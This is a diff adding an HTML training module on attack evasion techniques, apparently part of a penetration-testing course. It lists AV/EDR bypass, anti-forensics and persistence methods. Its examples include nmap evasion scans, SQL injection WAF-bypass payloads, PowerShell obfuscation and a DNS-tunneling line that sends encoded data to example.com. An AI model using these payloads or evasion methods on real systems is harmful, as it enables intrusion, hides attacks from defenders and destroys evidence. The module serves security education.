@@ -1,0 +1,299 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced Evasion Techniques</title>
+    <link rel="stylesheet" href="/styles.css">
+</head>
+<body>
+    <div class="container">
+        <h1>Module 23: Advanced Evasion Techniques</h1>
+
+        <div class="image-container">
+            <img src="/images/evasion-techniques.jpg" alt="Advanced Evasion Techniques" />
+        </div>
+
+        <h2>Learning Objectives</h2>
+        <ul>
+            <li>Master advanced evasion techniques for bypassing security controls</li>
+            <li>Understand detection system limitations and weaknesses</li>
+            <li>Learn payload encoding and obfuscation methods</li>
+            <li>Explore network-level evasion strategies</li>
+            <li>Practice anti-forensics and steganography techniques</li>
+            <li>Develop custom evasion tools and scripts</li>
+        </ul>
+
+        <h2>Introduction to Evasion Techniques</h2>
+        <p>
+            Evasion techniques are methods used to bypass security controls, avoid detection by 
+            security systems, and maintain persistence in target environments. Understanding these 
+            techniques is crucial for both offensive security testing and defensive security 
+            improvement.
+        </p>
+
+        <div class="warning">
+            <strong>Legal Notice:</strong> These techniques should only be used in authorized 
+            penetration testing scenarios with proper written permission. Unauthorized use of 
+            evasion techniques may violate laws and regulations.
+        </div>
+
+        <h2>Antivirus and EDR Evasion</h2>
+        <p>Modern endpoint protection solutions use multiple detection methods that require sophisticated evasion approaches:</p>
+
+        <h3>Signature-Based Detection Evasion</h3>
+        <ul>
+            <li><strong>Payload Encoding:</strong> XOR, Base64, custom encoding schemes</li>
+            <li><strong>Polymorphic Code:</strong> Self-modifying code that changes its signature</li>
+            <li><strong>Metamorphic Code:</strong> Code that completely rewrites itself</li>
+            <li><strong>Packing/Encryption:</strong> Compress and encrypt payloads</li>
+        </ul>
+
+        <h3>Behavioral Detection Evasion</h3>
+        <ul>
+            <li><strong>Sandbox Detection:</strong> Identify virtual environments and delay execution</li>
+            <li><strong>Sleep Timers:</strong> Delay malicious activity to avoid behavior analysis</li>
+            <li><strong>Legitimate Process Injection:</strong> Inject into trusted processes</li>
+            <li><strong>Living Off the Land:</strong> Use legitimate system tools</li>
+        </ul>
+
+        <h3>Memory-Based Evasion</h3>
+        <ul>
+            <li><strong>Reflective DLL Loading:</strong> Load libraries directly into memory</li>
+            <li><strong>Process Hollowing:</strong> Replace legitimate process memory</li>
+            <li><strong>Atom Bombing:</strong> Use Windows Atom Tables for code injection</li>
+            <li><strong>Manual DLL Loading:</strong> Bypass import table detection</li>
+        </ul>
+
+        <h2>Network Detection Evasion</h2>
+        <p>Network-based security controls can be bypassed using various traffic manipulation techniques:</p>
+
+        <h3>IDS/IPS Evasion Techniques</h3>
+        <ul>
+            <li><strong>Fragmentation:</strong> Split packets to avoid signature matching</li>
+            <li><strong>Protocol Manipulation:</strong> Use unusual protocol features</li>
+            <li><strong>Timing Attacks:</strong> Spread traffic over time to avoid thresholds</li>
+            <li><strong>Traffic Decoys:</strong> Generate noise to hide real attacks</li>
+        </ul>
+
+        <h3>Firewall Evasion</h3>
+        <ul>
+            <li><strong>Port Hopping:</strong> Change communication ports frequently</li>
+            <li><strong>Protocol Tunneling:</strong> Encapsulate traffic in allowed protocols</li>
+            <li><strong>Source Routing:</strong> Specify packet routing paths</li>
+            <li><strong>IPv6 Tunneling:</strong> Use IPv6 to bypass IPv4 rules</li>
+        </ul>
+
+        <div class="code-block">
+            <h4>Example: Nmap Firewall Evasion</h4>
+            <pre><code>
+# Fragmentation evasion
+nmap -f -sS target_ip
+
+# MTU discovery evasion  
+nmap --mtu 24 target_ip
+
+# Decoy scanning
+nmap -D RND:10 target_ip
+
+# Source port manipulation
+nmap --source-port 53 target_ip
+
+# Timing template for stealth
+nmap -T2 target_ip
+            </code></pre>
+        </div>
+
+        <h2>Application-Level Evasion</h2>
+        <p>Web application firewalls and security controls can be bypassed using various techniques:</p>
+
+        <h3>WAF Bypass Techniques</h3>
+        <ul>
+            <li><strong>Parameter Pollution:</strong> Send duplicate parameters</li>
+            <li><strong>Encoding Variations:</strong> URL, HTML, Unicode encoding</li>
+            <li><strong>Case Manipulation:</strong> Mix uppercase and lowercase</li>
+            <li><strong>Comment Insertion:</strong> Insert SQL comments to break patterns</li>
+            <li><strong>Alternative Syntax:</strong> Use different SQL syntax variations</li>
+        </ul>
+
+        <div class="code-block">
+            <h4>Example: SQL Injection WAF Bypass</h4>
+            <pre><code>
+# Standard payload (blocked)
+' OR 1=1--
+
+# Case manipulation
+' oR 1=1--
+
+# Comment insertion  
+'/**/OR/**/1=1--
+
+# Unicode encoding
+%27%20OR%201%3D1--
+
+# Parameter pollution
+?id=1&id=' OR 1=1--
+
+# Alternative syntax
+' OR 'a'='a'--
+            </code></pre>
+        </div>
+
+        <h2>Payload Obfuscation Techniques</h2>
+        <p>Various methods to hide malicious payloads from detection systems:</p>
+
+        <h3>Encoding Methods</h3>
+        <ul>
+            <li><strong>Base64 Encoding:</strong> Standard encoding with variations</li>
+            <li><strong>XOR Encryption:</strong> Simple encryption with key rotation</li>
+            <li><strong>ROT13/Caesar Cipher:</strong> Character substitution methods</li>
+            <li><strong>Custom Encoding:</strong> Application-specific encoding schemes</li>
+        </ul>
+
+        <h3>Code Obfuscation</h3>
+        <ul>
+            <li><strong>Variable Renaming:</strong> Use meaningless variable names</li>
+            <li><strong>Control Flow Obfuscation:</strong> Add unnecessary loops and conditions</li>
+            <li><strong>String Obfuscation:</strong> Break strings into pieces</li>
+            <li><strong>Dead Code Insertion:</strong> Add non-functional code</li>
+        </ul>
+
+        <div class="code-block">
+            <h4>Example: PowerShell Obfuscation</h4>
+            <pre><code>
+# Original command
+Invoke-Expression "Write-Host 'Hello World'"
+
+# Base64 encoded
+$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Write-Host 'Hello World'"))
+Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)))
+
+# String concatenation
+$cmd = "Write" + "-" + "Host" + " " + "'Hello" + " " + "World'"
+Invoke-Expression $cmd
+
+# Variable substitution  
+$w = "Write-Host"
+$m = "'Hello World'"
+& $w $m
+            </code></pre>
+        </div>
+
+        <h2>Anti-Forensics Techniques</h2>
+        <p>Methods to hinder digital forensic investigations:</p>
+
+        <h3>Log Evasion</h3>
+        <ul>
+            <li><strong>Log Deletion:</strong> Remove evidence from log files</li>
+            <li><strong>Log Manipulation:</strong> Modify timestamps and entries</li>
+            <li><strong>Syslog Redirection:</strong> Redirect logs to null device</li>
+            <li><strong>Event Log Clearing:</strong> Clear Windows Event Logs</li>
+        </ul>
+
+        <h3>Data Destruction</h3>
+        <ul>
+            <li><strong>Secure Deletion:</strong> Overwrite data multiple times</li>
+            <li><strong>Metadata Removal:</strong> Strip file metadata</li>
+            <li><strong>Timestamp Manipulation:</strong> Modify file access times</li>
+            <li><strong>Free Space Wiping:</strong> Overwrite unallocated disk space</li>
+        </ul>
+
+        <h2>Steganography and Covert Channels</h2>
+        <p>Hide data and communications within seemingly innocent content:</p>
+
+        <h3>Image Steganography</h3>
+        <ul>
+            <li><strong>LSB Manipulation:</strong> Hide data in least significant bits</li>
+            <li><strong>DCT Coefficient Modification:</strong> JPEG compression-based hiding</li>
+            <li><strong>Color Palette Manipulation:</strong> Modify color tables</li>
+            <li><strong>Metadata Injection:</strong> Hide data in EXIF information</li>
+        </ul>
+
+        <h3>Network Covert Channels</h3>
+        <ul>
+            <li><strong>ICMP Tunneling:</strong> Hide data in ping packets</li>
+            <li><strong>DNS Tunneling:</strong> Use DNS queries for communication</li>
+            <li><strong>HTTP Header Manipulation:</strong> Hide data in HTTP headers</li>
+            <li><strong>Timing Channels:</strong> Use packet timing for communication</li>
+        </ul>
+
+        <div class="code-block">
+            <h4>Example: DNS Tunneling</h4>
+            <pre><code>
+# Encode data in DNS subdomain
+data="secretmessage"
+encoded=$(echo $data | base64)
+dig $encoded.example.com
+
+# Extract data from DNS responses
+# Server responds with encoded data in TXT records
+dig TXT response.example.com
+            </code></pre>
+        </div>
+
+        <h2>Advanced Persistence Techniques</h2>
+        <p>Methods to maintain long-term access while avoiding detection:</p>
+
+        <h3>Registry-Based Persistence</h3>
+        <ul>
+            <li><strong>Run Keys:</strong> Standard autostart locations</li>
+            <li><strong>Services:</strong> Windows service persistence</li>
+            <li><strong>WMI Events:</strong> Windows Management Instrumentation</li>
+            <li><strong>COM Hijacking:</strong> Component Object Model manipulation</li>
+        </ul>
+
+        <h3>File System Persistence</h3>
+        <ul>
+            <li><strong>Alternate Data Streams:</strong> NTFS hidden data streams</li>
+            <li><strong>Hidden Files:</strong> System and hidden file attributes</li>
+            <li><strong>DLL Hijacking:</strong> Replace legitimate libraries</li>
+            <li><strong>Symbolic Links:</strong> Redirect file system access</li>
+        </ul>
+
+        <h2>Machine Learning Evasion</h2>
+        <p>Techniques to bypass AI/ML-based security systems:</p>
+
+        <h3>Adversarial Examples</h3>
+        <ul>
+            <li><strong>Gradient-Based Attacks:</strong> Use model gradients to craft evasive samples</li>
+            <li><strong>Black-Box Attacks:</strong> Query-based evasion without model access</li>
+            <li><strong>Feature Space Attacks:</strong> Manipulate input features</li>
+            <li><strong>Model Poisoning:</strong> Corrupt training data</li>
+        </ul>
+
+        <h2>Detection and Countermeasures</h2>
+        <p>Understanding evasion helps improve defensive capabilities:</p>
+
+        <h3>Detection Strategies</h3>
+        <ul>
+            <li><strong>Behavioral Analysis:</strong> Focus on actions rather than signatures</li>
+            <li><strong>Anomaly Detection:</strong> Identify unusual patterns</li>
+            <li><strong>Deception Technology:</strong> Use honeypots and canaries</li>
+            <li><strong>Zero Trust Architecture:</strong> Never trust, always verify</li>
+        </ul>
+
+        <h3>Defensive Improvements</h3>
+        <ul>
+            <li><strong>Multi-Layer Security:</strong> Defense in depth approach</li>
+            <li><strong>Threat Intelligence:</strong> Stay updated on new techniques</li>
+            <li><strong>Regular Testing:</strong> Validate security controls effectiveness</li>
+            <li><strong>Security Awareness:</strong> Train users to recognize threats</li>
+        </ul>
+
+        <div class="info">
+            <strong>Ethical Consideration:</strong> Always use evasion techniques responsibly. 
+            The goal is to improve security, not to cause harm. Ensure you have proper 
+            authorization before testing these techniques.
+        </div>
+
+        <div class="highlight">
+            <strong>Remember:</strong> Evasion techniques are constantly evolving. What works today 
+            may not work tomorrow. Stay current with security research and defensive improvements.
+        </div>
+
+        <h2>Next Steps</h2>
+        <p>In the next module, we'll explore red team operations and advanced persistent threat simulation techniques.</p>
+    </div>
+</body>
+</html>
